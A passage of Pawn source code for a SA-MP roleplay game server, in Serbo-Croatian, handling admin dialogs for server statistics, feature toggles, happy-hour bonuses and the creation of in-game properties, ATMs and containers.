						if( org_info[ i ][ oID ] > 0 )
						{
	                        format( globalstring, sizeof( globalstring ), "{FFFFFF}ID: (%d) - SQLID: (%d) | Naziv: %s\n", i, org_info[ i ][ oID ], org_info[ i ][ oName ] );
		                	strcat( DialogStrgEx, globalstring );
						}
					}
					ShowPlayerDialog( playerid, dialog_ORGLIST, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				}
			}
		}
	}
	else if(dialogid == dialog_SERVERSTATS )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_SERVERMI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																								"#\tOpcija\n\
																								{4282C0}(1).\t{FFFFFF}Upravljanje serverom\n\
																								{4282C0}(2).\t{FFFFFF}Napravi\n\
																								{4282C0}(3).\t{FFFFFF}Izbrisi\n\
																								{4282C0}(4).\t{FFFFFF}Izmeni\n\
																								{4282C0}(5).\t{FFFFFF}Spisak organizacija", "Odaberi", "Odustani" );
		}
       	if( response )
 		{
            switch( listitem )
			{
                case 0:
				{
                    new coordsstring[ 128 ], srecnisati[ 20 ], srecniposl[ 12 ], mogucnostreporta[ 11 ], mogucnostpitanja[ 11 ], mogucnostkupovinev[ 11 ], oglasici[ 11 ], regic[ 11 ];

                    if( ServerInfo[ HappyHours ] != 0 ) format(srecnisati, 20, "ON(x%d)(<%dlvl)", ServerInfo[ HappyHours ], ServerInfo[ HappyHoursLvl ]);
                    else format(srecnisati, 20, "Off");

                    if( ServerInfo[ HappyJobs ] != 0 ) format(srecniposl, 12, "ON(x%d)", ServerInfo[ HappyJobs ]);
                    else format(srecniposl, 12, "Off");

                    if( ServerInfo[ KupovinaVozila ] == true ) mogucnostkupovinev = "ukljucena";
                    else mogucnostkupovinev = "iskljucena";

                    if( ServerInfo[ Report ] == true ) mogucnostreporta = "ukljucena";
                    else mogucnostreporta = "iskljucena";

                    if( ServerInfo[ Pitanja ] == true ) mogucnostpitanja = "ukljucena";
                    else mogucnostpitanja = "iskljucena";

                    if( ServerInfo[ Oglasi ] == true ) oglasici = "ukljucena";
                    else oglasici = "iskljucena";

                    if( ServerInfo[ Registracija ] == true ) regic = "ukljucena";
                    else regic = "iskljucena";

			        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Ukupno poseta servera: {4282C0}%s {FF0000}| {FFFFFF}Ukupno registrovanih clanova: {4282C0}%s\n", fNumber(ServerInfo[ BrojPosetaServeru ]), fNumber(ServerInfo[ RegistrovanihKorisnika ]));
					strcat( DialogStrgEx, coordsstring );
					format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Ukupno banovanih korisnika: {4282C0}%s {FF0000}| {FFFFFF}Ukupno kikovanih korisnika: {4282C0}%s\n", fNumber(ServerInfo[ BanovanihKorisnika ]), fNumber(ServerInfo[ KikovanihKorisnika ]));
			        strcat( DialogStrgEx, coordsstring );
					format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Broj dodeljenih warnova: {4282C0}%s {FF0000}| {FFFFFF}Srecni sati: {4282C0}%s\n", fNumber(ServerInfo[ BrojWarnova ]), srecnisati );
			        strcat( DialogStrgEx, coordsstring );
					format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Srecni poslovi: {4282C0}%s\n", srecniposl );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Pocetni level: {4282C0}%d {FF0000}| {FFFFFF}Pocetni novac: {4282C0}$%d\n", ServerInfo[ PocetniLevel ], ServerInfo[ PocetniNovaca ] );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Mogucnost kupovine vozila je {4282C0}%s{FFFFFF}\n", mogucnostkupovinev );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Mogucnost slanja pitanja Admin timu je {4282C0}%s{FFFFFF}\n", mogucnostpitanja );
                    strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Mogucnost registracije je {4282C0}%s{FFFFFF}\n", regic );
					strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Mogucnost slanja reporta Admin timu je {4282C0}%s{FFFFFF}\n", mogucnostreporta );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Trenutni broj kreiranih vozila je {4282C0}%s{FFFFFF}\n", fNumber(ServerInfo[ BrojKreiranihVozila ]));
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Mogucnost postavljanja oglasa je {4282C0}%s{FFFFFF}\n", oglasici );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Rekord servera je {4282C0}%s{FFFFFF}\n", fNumber(ServerInfo[ RekordServera ]));
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), "{FFFFFF}Novac u banci {4282C0}$%s{FFFFFF}\n", fNumber(ServerInfo[ BankaNovac ]));
			        strcat( DialogStrgEx, coordsstring );
			        ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

					SaveServerStats( );
				}
				case 1:
				{
				    ServerStatsChose[ playerid ] = 1;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Mogucnost kupovine vozila:", "Ukljuci", "Iskljuci" );
				}
				case 2:
				{
				    ServerStatsChose[ playerid ] = 2;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Srecni sati(happyhours):", "Ukljuci", "Iskljuci" );
				}
				case 3:
				{
				    ServerStatsChose[ playerid ] = 3;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Srecni poslovi(happyjobs):", "Ukljuci", "Iskljuci" );
				}
				case 4:
				{
				    ServerStatsChose[ playerid ] = 4;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Mogucnost slanja pitanja:", "Ukljuci", "Iskljuci" );
				}
				case 5:
				{
				    ServerStatsChose[ playerid ] = 5;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Mogucnost slanja reporta:", "Ukljuci", "Iskljuci" );
				}
				case 6:
				{
					ShowPlayerDialog( playerid, dialog_SERVERSTATS_3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koji predstavlja pocetni level igraca pri registraciji:", "Potvrdi", "Odustani" );
				}
				case 7:
				{
					ShowPlayerDialog( playerid, dialog_SERVERSTATS_4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koji predstavlja pocetni novac igraca pri registraciji:", "Potvrdi", "Odustani" );
				}
				case 8:
				{
				    ServerStatsChose[ playerid ] = 6;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Mogucnost postavljanja oglasa:", "Ukljuci", "Iskljuci" );
				}
				case 9:
				{
				    ServerStatsChose[ playerid ] = 7;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Mogucnost registracije:", "Ukljuci", "Iskljuci" );
				}
			}
        }
	}
	else if(dialogid == dialog_SERVERSTATS_3 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new broj;
            if( sscanf( inputtext, "i", broj ) ) return ShowPlayerDialog( playerid, dialog_SERVERSTATS_3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koji predstavlja pocetni level igraca pri registraciji.", "Potvrdi", "Odustani" );
            if( broj < 1 || broj > 5 ) return SendErrorMessage( playerid, "Uneseni broj ne moze biti manji od 1, a veci od 5." );

            ServerInfo[ PocetniLevel ] = broj;
			SaveServerStats();
			SendInfoMessage( playerid, "Postavili ste pocetni level na {FFFFFF}(%d).", broj );
		}
	}
	else if(dialogid == dialog_SERVERSTATS_4 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new broj;
            if( sscanf( inputtext, "i", broj ) ) return ShowPlayerDialog( playerid, dialog_SERVERSTATS_4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite broj koji predstavlja pocetni novac igraca pri registraciji:", "Potvrdi", "Odustani" );
            if( broj < 1 ) return SendErrorMessage( playerid, "Uneseni broj ne moze biti manji od 1." );

            ServerInfo[ PocetniNovaca ] = broj;
			SaveServerStats( );
			SendInfoMessage( playerid, "Postavili ste pocetni novac na {FFFFFF}($%s).", fNumber(broj));
		}
	}
	else if(dialogid == dialog_HAPPYHOURS && response )
	{
	    new kol, lvl;
     	if( sscanf( inputtext, "ii", kol, lvl ) ) return ShowPlayerDialog( playerid, dialog_HAPPYHOURS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite koliki happyhours zelite i do kojeg levela. Primjer: 2 10\n\n{FF0000}* Ukoliko zelite za sve, a ne odredjenog levela upisite '0'.\nMAX: 4xRP & 20 LVL", "Potvrdi", "Odustani" );
      	if( kol < 2 || kol > 4 ) return SendErrorMessage( playerid, "Kolicina RPa ne moze biti manji od 2, a veci od 4." );
      	if( (lvl != 0 && lvl < 3) || kol > 20 ) return SendErrorMessage( playerid, "Kolicina LVLa ne moze biti manja od 0/3, a veca od 20." );

		ServerInfo[ HappyHours ] = kol;
	    ServerInfo[ HappyHoursLvl ] = lvl;

    	new str[64], str2[32];
		if(ServerInfo[HappyHours] == 0) format(str2, 32, "happyhours: ~r~(OFF)~n~");
		else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] == 0) format(str2, 32, "happyhours: ~g~(x%d)~n~", ServerInfo[HappyHours]);
		else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] != 0) format(str2, 32, "happyhours: ~g~(x%d<%d)~n~", ServerInfo[HappyHours], ServerInfo[HappyHoursLvl]);
		strcat(str, str2);

		TextDrawSetString(Ingame_gTD[4], str);

    	foreach(new i : Player) 
    	{
   			if(!TogHud[i] && PlayerLogged[i] && Spectate[i] == -1) TextDrawShowForPlayer(i, Ingame_gTD[4]);
  		}

    	SendInfoMessage( playerid, "Ukljucio/la si srecne sate (LVL: <%d | RP: x%d).", ServerInfo[ HappyHoursLvl ], ServerInfo[ HappyHours ] );
		SaveServerStats();
	}
	else if(dialogid == dialog_HAPPYJOBS && response )
	{
	    new kol;
     	if( sscanf( inputtext, "ii", kol ) ) return ShowPlayerDialog( playerid, dialog_HAPPYJOBS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite koliki happyjobs zelite.\n\n{FF0000}MAX: 3x$", "Potvrdi", "Odustani" );
      	if( kol < 2 || kol > 3 ) return SendErrorMessage( playerid, "Kolicina $ ne moze biti manji od 2, a veci od 3." );

		ServerInfo[ HappyJobs ] = kol;

    	new str[64], str2[32];
		if(ServerInfo[HappyJobs] == 0) format(str2, 32, "~w~happyjob: ~r~(OFF)");
		else format(str2, 32, "~w~happyjob: ~g~(x%d)", ServerInfo[HappyJobs]);
		strcat(str, str2);
		TextDrawSetString(Ingame_gTD[4], str);

    	foreach(new i : Player) 
    	{
   			if(!TogHud[i] && PlayerLogged[i] && Spectate[i] == -1) TextDrawShowForPlayer(i, Ingame_gTD[4]);
  		}

    	SendInfoMessage( playerid, "Ukljucio/la si srecne poslove (%dx$).", ServerInfo[ HappyJobs ] );
		SaveServerStats();
	}
	else if(dialogid == dialog_SERVERSTATS_2 )
	{
        if( response )
		{
            switch( ServerStatsChose[ playerid ] )
			{
                case 1:
				{
                    ServerInfo[ KupovinaVozila ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost kupovine vozila po salonima." );
                }
                case 2:
				{
					ShowPlayerDialog(playerid, dialog_HAPPYHOURS, DIALOG_STYLE_INPUT, "{FFFFFF}HappyHours:", "{FFFFFF}Upisite koliki happyhours zelite i do kojeg levela. Primjer: 2 10\n\n{FF0000}* Ukoliko zelite za sve, a ne odredjenog levela upisite '0'.", "Potvrdi", "Zatvori");
                }
                case 3:
				{
					ShowPlayerDialog(playerid, dialog_HAPPYJOBS, DIALOG_STYLE_INPUT, "{FFFFFF}HappyJobs:", "{FFFFFF}Upisite koliki happyjobs zelite:", "Potvrdi", "Zatvori");
                }
                case 4:
				{
                    ServerInfo[ Pitanja ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost slanja pitanja Admin timu." );
                }
                case 5:
				{
                    ServerInfo[ Report ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost slanja reporta Admin timu." );
                }
                case 6:
				{
                    ServerInfo[ Oglasi ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost postavljanja oglasa." );
                }
                case 7:
				{
                    ServerInfo[ Registracija ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost registracije." );
                }
			}
			SaveServerStats( );
		}
		else if( !response )
		{
            switch( ServerStatsChose[ playerid ] )
			{
                case 1:
				{
                    ServerInfo[ KupovinaVozila ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost kupovine vozila po salonima." );
                }
                case 2:
				{
                    ServerInfo[ HappyHours ] = 0;
                    ServerInfo[ HappyHoursLvl ] = 0;

                    new str[64], str2[32];
					if(ServerInfo[HappyHours] == 0) format(str2, 32, "happyhours: ~r~(OFF)~n~");
					else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] == 0) format(str2, 32, "happyhours: ~g~(x%d)~n~", ServerInfo[HappyHours]);
					else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] != 0) format(str2, 32, "happyhours: ~g~(x%d<%d)~n~", ServerInfo[HappyHours], ServerInfo[HappyHoursLvl]);
					strcat(str, str2);

					if(ServerInfo[HappyJobs] == 0) format(str2, 32, "~w~happyjob: ~r~(OFF)");
					else format(str2, 32, "~w~happyjob: ~g~(x%d)", ServerInfo[HappyJobs]);
					strcat(str, str2);
					TextDrawSetString(Ingame_gTD[4], str);

				   	foreach(new i : Player) 
				   	{
				   		TextDrawHideForPlayer(i, Ingame_gTD[4]);
				   		TextDrawShowForPlayer(i, Ingame_gTD[4]);
				  	}
                    SendInfoMessage( playerid, "Iskljucio si srecne sate." );
                }
                case 3:
				{
                    ServerInfo[ HappyJobs ] = 0;

                    new str[64], str2[32];
					if(ServerInfo[HappyHours] == 0) format(str2, 32, "happyhours: ~r~(OFF)~n~");
					else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] == 0) format(str2, 32, "happyhours: ~g~(x%d)~n~", ServerInfo[HappyHours]);
					else if(ServerInfo[HappyHours] != 0 && ServerInfo[HappyHoursLvl] != 0) format(str2, 32, "happyhours: ~g~(x%d<%d)~n~", ServerInfo[HappyHours], ServerInfo[HappyHoursLvl]);
					strcat(str, str2);

					if(ServerInfo[HappyJobs] == 0) format(str2, 32, "~w~happyjob: ~r~(OFF)");
					else format(str2, 32, "~w~happyjob: ~g~(x%d)", ServerInfo[HappyJobs]);
					strcat(str, str2);
					TextDrawSetString(Ingame_gTD[4], str);

				    foreach(new i : Player) 
				    {
				    	TextDrawHideForPlayer(i, Ingame_gTD[4]);
				   		TextDrawShowForPlayer(i, Ingame_gTD[4]);
				  	}
                    SendInfoMessage( playerid, "Iskljucio si srecne poslove." );
                }
                case 4:
				{
                    ServerInfo[ Pitanja ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost slanja pitanja Staff timu." );
                }
                case 5:
				{
                    ServerInfo[ Report ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost slanja reporta Staff timu." );
                }
                case 6:
				{
                    ServerInfo[ Oglasi ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost postavljanja oglasa." );
                }
                case 7:
				{
                    ServerInfo[ Registracija ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost registracije." );
                }
			}
			SaveServerStats();
		}
	}
	else if(dialogid == dialog_CREATEVEH )
	{
	    if( response )
		{
	        switch( listitem )
			{
				case 0: ShowPlayerDialog( playerid, dialog_VCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog vozila, id boje1, id boje2.", "Potvrdi", "Nazad" );
				case 1: ShowPlayerDialog( playerid, dialog_OVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta, id organizacije, id boje1, id boje2.", "Potvrdi", "Nazad" );
				case 2: ShowPlayerDialog( playerid, dialog_IVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta za izlozbeno vozilo, id boje1, id boje2.", "Potvrdi", "Nazad" );
			}
	    }
	}
	else if(dialogid == dialog_NAPRAVISVE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_SERVERMI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																								"#\tOpcija\n\
																								{4282C0}(1).\t{FFFFFF}Upravljanje serverom\n\
																								{4282C0}(2).\t{FFFFFF}Napravi\n\
																								{4282C0}(3).\t{FFFFFF}Izbrisi\n\
																								{4282C0}(4).\t{FFFFFF}Izmeni\n\
																								{4282C0}(5).\t{FFFFFF}Spisak organizacija", "Odaberi", "Odustani" );
		}
        if( response )
		{
            switch( listitem )
			{
			    case 0:
				{
			    	ShowPlayerDialog( playerid, dialog_ORGCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeno ime vase organizacije:", "Potvrdi", "Nazad" );
				}
				case 1:
				{
				    ShowPlayerDialog( playerid, dialog_CREATEVEH, DIALOG_STYLE_LIST, D_NASLOV, "Privatno vozilo\nOrganizacijsko vozilo\nIzlozbeno vozilo", "Potvrdi", "Nazad" );
				}
				case 2:
				{
                    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

					strcat( DialogStrgEx, "{FFFFFF}Unesite vrstu firme koju zelite.\n" );
					strcat( DialogStrgEx, "0. 24/7 | 1. Burg | 2. Cluckin Bell | 3. Binco | 4. ((empty)) | 5. Zip | 6. Victim | 7. Suburban\n" );
			        strcat( DialogStrgEx, "8. Bar | 9. Gym | 10. Gun Shop | 11. MRestoran | 12. VRestoran | 13. Pizza | 14. Nocni klub\n" );
					strcat( DialogStrgEx, "15. Disco | 16. Electronic Shop | 17. Trafika | 18. Firma za posao | 19. Rent firma | 20. ((empty))\n" );
					strcat( DialogStrgEx, "21. Javna Kuca | 22. Kladionica | 23. Oglas | 24. ((empty)) | 25. ((empty)) | 26. ((empty))\n" );
					strcat( DialogStrgEx, "27. ((empty)) | 28. ((empty)) | 29. Lutrija | 30. Casino" );

					ShowPlayerDialog( playerid, dialog_FCREATE, DIALOG_STYLE_INPUT, D_NASLOV, DialogStrgEx, "U redu", "" );

					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				}
		        case 3:
				{
				    new as = Iter_Free(iter_Kont);

					if( KontInfo[ (MAX_KONT-1) ][ koSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreiranih kontejnera." );

					GetPlayerPos( playerid, KontInfo[ as ][ koObjPos ][ 0 ], KontInfo[ as ][ koObjPos ][ 1 ], KontInfo[ as ][ koObjPos ][ 2 ]);

		    		KontInfo[ as ][ koObjRot ][ 0 ] = 0;
		    		KontInfo[ as ][ koObjRot ][ 1 ] = 0;
		    		KontInfo[ as ][ koObjRot ][ 2 ] = 0;

					KontInfo[ as ][ koObjID ] = CreateDynamicObject(1345, KontInfo[ as ][ koObjPos ][ 0 ]+2, KontInfo[ as ][ koObjPos ][ 1 ], KontInfo[ as ][ koObjPos ][ 2 ]+0.6, 0.0, 0.0, 0.0);
                    Streamer_Update( playerid );
					EditDynamicObject( playerid, KontInfo[ as ][ koObjID ] );

					EditKontejnera[ playerid ] = as;
				 	mSQL_CreateContainer( as );
				 	Iter_Add(iter_Kont, as);
		        }
		        case 4:
				{
		            ShowPlayerDialog( playerid, dialog_IMCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite vrstu kuce koju zelite.\nVrste: 1. Mala kuca 2. Srednja Kuca 3. Velika kuca", "Potvrdi", "Nazad" );
				}
		        case 5:
			 	{
			 	    new im = Iter_Free(iter_Imovina);
					if( II[ (MAX_IMOVINA-1) ][ iSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreirane imovine." );

		            new string[ 220 ];
				    II[ im ][ iUsage ] = IMOVINA_STAN;
				    II[ im ][ iExit ][ 0 ] = STAN_X;
		    		II[ im ][ iExit ][ 1 ] = STAN_Y;
		    		II[ im ][ iExit ][ 2 ] = STAN_Z;
				    II[ im ][ iPrice ] = STAN_PRICE;
				    II[ im ][ iInterior ] = STAN_INT;
				    II[ im ][ iVrsta ] = 0;
					II[ im ][ iOwned ] = 0;
					II[ im ][ iOnAuction ] = false;
					II[ im ][ iOwnerSQLID ] = -1;
                	II[ im ][ iNeaktivnost ] = 0;
					strmid( II[ im ][ iOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
					GetPlayerPos( playerid, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				    II[ im ][ iLocked ] = 0;
				    II[ im ][ iVW ] = im;
				    II[ im ][ iLevel ] = 3;
				    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
					II[ im ][ iMats ] = 0;
					II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
					II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
					II[ im ][ iDrugAmmount ] = 0;
		            II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0;
					mSQL_CreateProperty( im );

				    format( string, sizeof( string ),
						"(STAN - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{FF0000}Level: {FFFFFF}%d\n\
						{FF0000}Adresa: {FFFFFF}%s\n\
						{FF0000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );

					ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0xFF0000FF, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
				    ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], .priority = 26 );
					SendInfoMessage( playerid, "Uspesno si kreirao stan." );
				}
				case 6:
				{
				    new im = Iter_Free(iter_Imovina);
					if( II[ (MAX_IMOVINA-1) ][ iSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreirane imovine." );

		            new string[ 220 ];
					if( II[im][iSQLID] != 0) return SendErrorMessage( playerid, "ID te imovine vec postoji." );
				    II[ im ][ iUsage ] = IMOVINA_VIKENDICA;
				    II[ im ][ iExit ][ 0 ] = VIKENDICA_X;
		    		II[ im ][ iExit ][ 1 ] = VIKENDICA_Y;
		    		II[ im ][ iExit ][ 2 ] = VIKENDICA_Z;
				    II[ im ][ iPrice ] = VIKENDICA_PRICE;
				    II[ im ][ iInterior ] = VIKENDICA_INT;
				    II[ im ][ iVrsta ] = 0;
					II[ im ][ iOwned ] = 0;
					II[ im ][ iOnAuction ] = false;
					II[ im ][ iOwnerSQLID ] = -1;
                	II[ im ][ iNeaktivnost ] = 0;
					strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
					GetPlayerPos( playerid, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				    II[ im ][ iLocked ] = 0;
				    II[ im ][ iVW ] = im;
				    II[ im ][ iLevel ] = 5;
				    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
					II[ im ][ iMats ] = 0;
					II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
					II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
					II[ im ][ iDrugAmmount ] = 0;
		            II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0;
					mSQL_CreateProperty( im );

	    			format( string, sizeof( string ),
						"(VIKENDICA - [%d])\n\
						Cena: {FFFFFF}$%d\n\
						{7B8000}Level: {FFFFFF}%d\n\
						{7B8000}Adresa: {FFFFFF}%s\n\
						{7B8000}[ /kupiimovinu ]", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );

					ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x7B8000FF, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, IPI, IVI, 0, -1, -1, .priority = 26);
				    ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], .priority = 26 );
					SendInfoMessage( playerid, "Uspesno si kreirao vikendicu." );
				}
				case 7: 
				{
				    new const id = Iter_Free(iter_Tiki);
				    if(id == -1) return SendErrorMessage(playerid, "BEEP! Nema vise mjesta da se kreira Tiki, mora se prosiriti MAX_TIKI u skripti!");

				    GetPlayerPos(playerid, TikiInfo[id][tPosX], TikiInfo[id][tPosY], TikiInfo[id][tPosZ]);
				    mSQL_CreateTiki(id);

				    SendInfoMessage( playerid, "Uspesno ste kreirali Tiki-a.");
				    DodajWarnRed("~p~(CREATE) %s ~w~je kreira%s Tiki ~p~ID %d", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), id);
				}
				case 8:
				{
    				new as = Iter_Free(iter_ATM);

					if( atmInfo[ (MAX_ATM-1) ][ atmSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreiranih bankomata." );

					GetPlayerPos( playerid, atmInfo[ as ][ atmPos ][ 0 ], atmInfo[ as ][ atmPos ][ 1 ], atmInfo[ as ][ atmPos ][ 2 ]);
		    		atmInfo[ as ][ atmPos ][ 3 ] = 0;
		    		atmInfo[ as ][ atmPos ][ 4 ] = 0;
		    		atmInfo[ as ][ atmPos ][ 5 ] = 0;

					atmInfo[ as ][ atmObject ] = CreateDynamicObject( 2942, atmInfo[ as ][ atmPos ][ 0 ]+2, atmInfo[ as ][ atmPos ][ 1 ], atmInfo[ as ][ atmPos ][ 2 ]+0.6, 0.0, 0.0, 0.0 );
      				Streamer_Update( playerid );
					EditDynamicObject( playerid, atmInfo[ as ][ atmObject ] );

					EditATM[ playerid ] = as;
				 	mSQL_CreateATM( as );
				 	Iter_Add(iter_ATM, as);
				}
		        case 9:
				{
					SendErrorMessage(playerid, "Ovdje nema nista.");
				}
				case 10:
				{
				    ShowPlayerDialog( playerid, dialog_CREATEGATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ID objekta kapije:", "Potvrdi", "Nazad" );
				}
				case 11:
				{
				    SendErrorMessage(playerid, "Ovdje nema nista za napravit.");
				}
				case 12:
				{
				    SendErrorMessage(playerid, "Ovdje nema nista za napravit.");
				}
				case 13:
				{
				    ShowPlayerDialog( playerid, dialog_CREATEGPS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ime ovog mesta za gps.", "Potvrdi", "Nazad" );
				}
				case 14:
				{
				    ShowPlayerDialog( playerid, dialog_GANGZCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za gang zonu.\nPrimer: FF2244", "Potvrdi", "Nazad" );
				}
				case 15:
				{
				    #if XMAS_MOD == 1

		            	new i = Iter_Free(iter_Present);

						if( presentsInfo[ (MAX_PRESENTS-1) ][ presSQLID ] != 0 ) return SendErrorMessage( playerid, "Ima maksimalno kreiranih poklona." );

						GetPlayerPos( playerid, presentsInfo[ i ][ presPos ][ 0 ], presentsInfo[ i ][ presPos ][ 1 ], presentsInfo[ i ][ presPos ][ 2 ]);

   						presentsInfo[ i ][ presPos ][ 3 ] = 0;
    					presentsInfo[ i ][ presPos ][ 4 ] = 0;
    					presentsInfo[ i ][ presPos ][ 5 ] = 0;
    					presentsInfo[ i ][ presTaken ] = false;

